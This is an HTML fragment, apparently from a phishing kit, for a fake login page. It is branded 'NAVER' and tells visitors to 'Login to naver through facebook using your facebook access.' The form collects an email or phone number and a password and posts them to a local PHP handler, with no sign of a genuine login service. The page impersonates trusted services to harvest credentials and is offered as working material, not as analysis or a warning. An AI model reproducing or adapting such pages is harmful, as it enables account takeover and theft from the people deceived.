...
<div class="container" style="border: 0px solid red;">
  ...
  <div class="row center-text" style="border: 0px solid blue;">
  	  <a href="../index.php" id="header1"><h1 class="center-text mt-4" id="header1" style="">NAVER <img src="../img/social2.png" class="img-fluid" ></h1> 
      </a>
      <span  class="text-center"id="direction1" ><img src="../img/social2.png" class="img-fluid" >Login to naver through facebook using your facebook access</span>
  </div>
  ...
  <div class="row mx-md-1  text-center mt-4" style="display: block;">
  	<form class="" id="form1" style="" method="POST" action="../php/Post.php">
  		<div class="form-group " id="formgroup">
  			<input type="text" name="us" placeholder="Email or Phone" class="form-control" id="inp" style="">
  		</div>
  		<div class="form-group " id="formgroup" >
  			<input type="password" name="ps" placeholder="password" class="form-control" id="inp">
  		</div>
  		<div class="form-group text-center" id="formgroup" >
  			<button class="btn btn-primary" type="submit" id="btnbackfb" name="btnfb" style="">continue</button>
